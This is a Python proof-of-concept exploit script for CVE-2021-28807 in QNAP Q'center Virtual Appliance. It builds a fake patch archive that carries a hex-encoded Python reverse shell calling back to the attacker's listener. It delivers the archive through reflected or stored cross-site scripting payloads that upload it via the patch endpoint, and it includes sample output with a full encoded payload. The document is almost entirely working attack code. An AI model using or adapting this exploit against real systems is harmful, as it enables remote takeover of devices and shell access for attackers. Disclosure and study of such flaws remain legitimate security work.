#!/usr/bin/env python3
# coding: utf8
#
# $ \tmp\poc\CVE-2021-28807> python .\poc.py -ip 192.168.153.1 -port 9595 -victimip 192.168.153.128 -reflected y                                        
# [+] created in memory patch.qpkg
# [+] created in memory QcenterServerVMAppPatch_1.12.1014 archive 
#
# Do you have open the listener on 192.168.153.1:9595 [Y/N]? Y    
#
# [+] creating the reflected-XSS payload
#
# https://192.168.153.128/qcenter/redirect.html?redirect=javascript:eval(atob("ZnVuY3Rpb24gYmFzZTY0dG9CbG9iKGJhc2U2NERhdGEsIGNvbnRlbnRUeXBlKSB7IGNvbnRlbnRUeXBlID0gY29udGVudFR5cGUgfHwgJyc7IHZhciBzbGljZVNpemUgPSAxMDI0OyB2YXIgYnl0ZUNoYXJhY3RlcnMgPSBhdG9iKGJhc2U2NERhdGEpOyB2YXIgYnl0ZXNMZW5ndGggPSBieXRlQ2hhcmFjdGVycy5sZW5ndGg7IHZhciBzbGljZXNDb3VudCA9IE1hdGguY2VpbChieXRlc0xlbmd0aCAvIHNsaWNlU2l6ZSk7IHZhciBieXRlQXJyYXlzID0gbmV3IEFycmF5KHNsaWNlc0NvdW50KTsgZm9yICh2YXIgc2xpY2VJbmRleCA9IDA7IHNsaWNlSW5kZXggPCBzbGljZXNDb3VudDsgKytzbGljZUluZGV4KSB7IHZhciBiZWdpbiA9IHNsaWNlSW5kZXggKiBzbGljZVNpemU7IHZhciBlbmQgPSBNYXRoLm1pbihiZWdpbiArIHNsaWNlU2l6ZSwgYnl0ZXNMZW5ndGgpOyB2YXIgYnl0ZXMgPSBuZXcgQXJyYXkoZW5kIC0gYmVnaW4pOyBmb3IgKHZhciBvZmZzZXQgPSBiZWdpbiwgaSA9IDA7IG9mZnNldCA8IGVuZDsgKytpLCArK29mZnNldCkgeyBieXRlc1tpXSA9IGJ5dGVDaGFyYWN0ZXJzW29mZnNldF0uY2hhckNvZGVBdCgwKTsgfSBieXRlQXJyYXlzW3NsaWNlSW5kZXhdID0gbmV3IFVpbnQ4QXJyYXkoYnl0ZXMpOyB9IHJldHVybiBuZXcgQmxvYihieXRlQXJyYXlzLCB7IHR5cGU6IGNvbnRlbnRUeXBlIH0pOyB9IHZhciB1cmwgPSAnaHR0cHM6XC9cLzE5Mi4xNjguMTUzLjEyOFwvcWNlbnRlclwvaGF3a2V5ZVwvdjFcL3BhdGNoP3VwbG9hZCc7dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsIHVybCwgdHJ1ZSk7dmFyIGNvbnRlbnRfdHlwZSA9ICdhcHBsaWNhdGlvbi94LWd6aXAnOyB2YXIgYmxvYiA9IGJhc2U2NHRvQmxvYigiSDRzSUNDNUkwMkFDLzFGalpXNTBaWEpUWlhKMlpYSldUVUZ3Y0ZCaGRHTm9YekV1TVRJdU1UQXhOQUR0MGJ0S0EwRVVCdUFSTFNUaUd3aE8xc0pkMkV4Mm9ra01pMmlRZUNGNGlVa1hWT0s2bWlYSnpyb3pBUlVSTEt6c0JWL0d5Z2NRMzhES1Fpd3RySFF4OFlMYWlUYitYM1BtL00yY014UFVsRk5udTBGamgvd2FLNUlaSDMrcGtjL1Z5bVRTYitkT25zMk9aUW0xeUI5b1MxVUxveXZKL3pRU1QyNTZmbExXWThHK3FndWZKaHc2NnJVQ0VTb3FoZE53bFNuYm0wRW9IRmRLVTBoYlRuWmkxaWw2dDh2UGJpd3NGU3BtdHkwdnp4UTN5cFhWUW43UnNDVnpoTys3anRKMWplZFNqR2NtR0UrUE1hNlp1WFF1YlJpMmtHeXJIYVIweWJhOXB1c0wzVEF0dzZiZnhQejdPR1hZd2VUN29NeXBOWnQ2VmV2dXBwbGF3dFBXREhzMDV1NTVpbklyRmsya1F0RmswZWV6bllPdjd6SjgyazhHSHQxMTBudC9YVzJzblozMEhNZHY1dnVHVHFiamcvR251L1BMajQ0dXBzamg3VU9WWExYNjZRK1VITmRYYnBpb0ZNcVYxNHd6YnJHc2xlSzB0SlJmS2EwVTV5Z2xBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFoRHdESmxkUzdnQW9BQUE9IiwgY29udGVudF90eXBlKTt2YXIgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTtmb3JtRGF0YS5hcHBlbmQoJ3Bhc3N3ZCcsICdZV0ZoWVdGaCcpO2Zvcm1EYXRhLmFwcGVuZCgnYnJvd3NlX2ZpbGUnLCBibG9iLCdRY2VudGVyU2VydmVyVk1BcHBQYXRjaF8xLjEwLjkwMDEuZ3onKTt4aHIuc2VuZChmb3JtRGF0YSk7"));
# $ \tmp\poc\CVE-2021-28807> 
# 
# -----------
#
# NOTE: "-reflected n" require the "-payloadurl https://example.com/a.js" to be pass as an argument, the URL should be the future place where the payload is going to be hosted so the stager can retrieve it
#
#
# NOTE: create a ssl certificate in pem format (cert+key) and save it with the following name "certificate.pem" if you want to test localy (you need to sign the cert with a trusted CA)
#
# openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
# cat .\key.pem > certificate.pem
# cat .\cert.pem >> .\certificate.pem
#
#
# tested on:
#   QNAP Qcenter Virtual Appliance < 1.12.1014 (for the reflected payload, a previous version may be required)
# 
# zi0Black, 24/06/2021

from functools import partial
from io import BytesIO
import tarfile
import base64
import requests
import argparse
import codecs
import binascii
import ssl
from http.server import HTTPServer, BaseHTTPRequestHandler
requests.urllib3.disable_warnings()
qpkg_default = "23212F62696E2F73680A707974686F6E202D632027696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E656374282822{ip}222C{port}29293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B206F732E6475703228732E66696C656E6F28292C32293B703D73756270726F636573732E63616C6C285B222F62696E2F7368222C222D69225D293B270A657869742031300A636F6E74726F6C2E7461722E677A0000000000000000000000000000000000001F8B08000BF9655E0003EDD25B6B5D9685018121E148041C8540210D21FFEB99C4C4C4C4C4C4C4C4C4C4C4C4C47EBE3F007CE7F55B00D06D082020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020205163656E7465722D544553542020202020202020312E31302E3730323120514E415051504B472020"
arch_name = "QcenterServerVMAppPatch_1.12.1014"

def create_malicius_qpkg(ip, port, victim_ip, reflected, payloadport, payloadurl):
    hex_ip = codecs.encode(ip.encode(), 'hex')
    hex_port = codecs.encode(port.encode(), 'hex')
    qpkg_custom = qpkg_default.format(ip=hex_ip.decode('utf-8'),port=hex_port.decode('utf-8'))
    qpkg_file = BytesIO(binascii.unhexlify(qpkg_custom))
    print("[+] created in memory patch.qpkg")
    patch_gz = BytesIO()
    patch_gz.name = arch_name+".gz"
    make_targz(patch_gz, qpkg_file)
    print("[+] created in memory {0} archive \n".format(arch_name))
    base64_patch = bytes
    base64_patch = base64.b64encode(patch_gz.getvalue())
    patch_gz.close()
    answer = ""
    while answer != 'y':
        answer = input("Do you have open the listener on {lip}:{lport} [Y/N]? ".format(lip=ip,lport=port)).lower()

    if reflected == 'y':
        print("\n[+] creating the reflected-XSS payload\n")
        print(generate_xss(victim_ip,base64_patch))
    else:
        print("\n[+] sending the payload to {0}".format(victim_ip))
        send_stored_xss(victim_ip,ip,payloadport,base64_patch,payloadurl)    
    return

def make_targz(file_obj: BytesIO,file_bytes: BytesIO):
    with tarfile.open(fileobj=file_obj,mode="w:gz") as tar:
        info = tarfile.TarInfo("patch.qpkg")
        info.size = len(file_bytes.getbuffer())
        tar.addfile(info,file_bytes)
        tar.close()    
    return

def generate_xss(victim_ip,archiveb64):
    Reflected_xss="https://{ip}/qcenter/redirect.html?redirect=javascript:eval(atob(\"".format(ip=victim_ip)
    aus = "function base64toBlob(base64Data, contentType) { contentType = contentType || ''; var sliceSize = 1024; var byteCharacters = atob(base64Data); var bytesLength = byteCharacters.length; var slicesCount = Math.ceil(bytesLength / sliceSize); var byteArrays = new Array(slicesCount); for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) { var begin = sliceIndex * sliceSize; var end = Math.min(begin + sliceSize, bytesLength); var bytes = new Array(end - begin); for (var offset = begin, i = 0; offset < end; ++i, ++offset) { bytes[i] = byteCharacters[offset].charCodeAt(0); } byteArrays[sliceIndex] = new Uint8Array(bytes); } return new Blob(byteArrays, { type: contentType }); }"
    aus += " var url = 'https:\/\/{ip}\/qcenter\/hawkeye\/v1\/patch?upload';".format(ip=victim_ip)
    aus += "var xhr = new XMLHttpRequest(); xhr.open('POST', url, true);"
    aus += "var content_type = 'application/x-gzip'; var blob = base64toBlob(\"{archiveb64_enc}\", content_type);var formData = new FormData();formData.append('passwd', 'YWFhYWFh');formData.append('browse_file', blob,'QcenterServerVMAppPatch_1.10.9001.gz');".format(archiveb64_enc=str(archiveb64, 'UTF-8'))
    aus += "xhr.send(formData);"
    aus = base64.b64encode(bytes(aus,"utf-8"))
    aus = aus.decode("utf-8")+"\"));"
    Reflected_xss += aus
    return Reflected_xss

def send_stored_xss(victim_ip,ip,payloadport,archiveb64,stagedpayloadurl):
    payload = "aa<img src=# onerror=\"s = document.createElement('script');s.setAttribute('src','{src}');document.body.appendChild(s);\">".format(src=stagedpayloadurl)
    r = requests.post('https://{ip}/qcenter/hawkeye/v1/login'.format(ip=victim_ip), json={"name": payload, "password": "YWRtaW4=", "remeber": False}, verify=False)
    payload="eval(atob(\""
    aus = "function base64toBlob(base64Data, contentType) { contentType = contentType || ''; var sliceSize = 1024; var byteCharacters = atob(base64Data); var bytesLength = byteCharacters.length; var slicesCount = Math.ceil(bytesLength / sliceSize); var byteArrays = new Array(slicesCount); for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) { var begin = sliceIndex * sliceSize; var end = Math.min(begin + sliceSize, bytesLength); var bytes = new Array(end - begin); for (var offset = begin, i = 0; offset < end; ++i, ++offset) { bytes[i] = byteCharacters[offset].charCodeAt(0); } byteArrays[sliceIndex] = new Uint8Array(bytes); } return new Blob(byteArrays, { type: contentType }); }"
    aus += " var url = 'https:\/\/{ip}\/qcenter\/hawkeye\/v1\/patch?upload';".format(ip=victim_ip)
    aus += "var xhr = new XMLHttpRequest(); xhr.open('POST', url, true);"
    aus += "var content_type = 'application/x-gzip'; var blob = base64toBlob(\"{archiveb64_enc}\", content_type);var formData = new FormData();formData.append('passwd', 'YWFhYWFh');formData.append('browse_file', blob,'QcenterServerVMAppPatch_1.10.9001.gz');".format(archiveb64_enc=str(archiveb64, 'UTF-8'))
    aus += "xhr.send(formData);"
    aus = base64.b64encode(bytes(aus,"utf-8"))
    aus = aus.decode("utf-8")+"\"));"
    payload += aus
    print("\n\n[*] PAYLOAD - serve this at the following url: {0}\n\n".format(stagedpayloadurl))
    print(payload)
    print("\n\n[+] Login (with a privileged user) on Q'center and visiti: LOG -> Q'center Event")
    #serverPayload(payloadport,victim_ip,archiveb64)
    return

# This code is required for local tests, I'm going to left it there just in case :)
class RequestHandler(BaseHTTPRequestHandler):
    def __init__(self, victimip, archiveb64, *args, **kwargs):
        self.victimip = victimip
        self.archiveb64 = archiveb64
        super().__init__(*args, **kwargs)

    def do_GET(self):
        payload="eval(atob(\""
        aus = "function base64toBlob(base64Data, contentType) { contentType = contentType || ''; var sliceSize = 1024; var byteCharacters = atob(base64Data); var bytesLength = byteCharacters.length; var slicesCount = Math.ceil(bytesLength / sliceSize); var byteArrays = new Array(slicesCount); for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) { var begin = sliceIndex * sliceSize; var end = Math.min(begin + sliceSize, bytesLength); var bytes = new Array(end - begin); for (var offset = begin, i = 0; offset < end; ++i, ++offset) { bytes[i] = byteCharacters[offset].charCodeAt(0); } byteArrays[sliceIndex] = new Uint8Array(bytes); } return new Blob(byteArrays, { type: contentType }); }"
        aus += " var url = 'https:\/\/{ip}\/qcenter\/hawkeye\/v1\/patch?upload';".format(ip=self.victimip)
        aus += "var xhr = new XMLHttpRequest(); xhr.open('POST', url, true);"
        aus += "var content_type = 'application/x-gzip'; var blob = base64toBlob(\"{archiveb64_enc}\", content_type);var formData = new FormData();formData.append('passwd', 'YWFhYWFh');formData.append('browse_file', blob,'QcenterServerVMAppPatch_1.10.9001.gz');".format(archiveb64_enc=str(self.archiveb64, 'UTF-8'))
        aus += "xhr.send(formData);"
        aus = base64.b64encode(bytes(aus,"utf-8"))
        aus = aus.decode("utf-8")+"\"));"
        payload += aus
        self.send_response(200)
        self.send_header('Content-type', 'application/javascript')
        self.end_headers()
        self.wfile.write(bytes(payload))

def serverPayload(port,victimip, archiveb64,server_class=HTTPServer):
    server_address = ('', int(port))
    handler_class = partial(RequestHandler, victimip, archiveb64)
    httpd = server_class(server_address, handler_class)
    print('Starting httpd on port {}...'.format(port))
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='certificate.pem', server_side=True)
    httpd.serve_forever()                        

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip")
    parser.add_argument("-port")
    parser.add_argument("-victimip")
    parser.add_argument("-reflected")
    parser.add_argument("-payloadport")
    parser.add_argument("-payloadurl")
    args = parser.parse_args()
    create_malicius_qpkg(args.ip,args.port,args.victimip,args.reflected,args.payloadport,args.payloadurl)

if __name__ == "__main__":
    main()    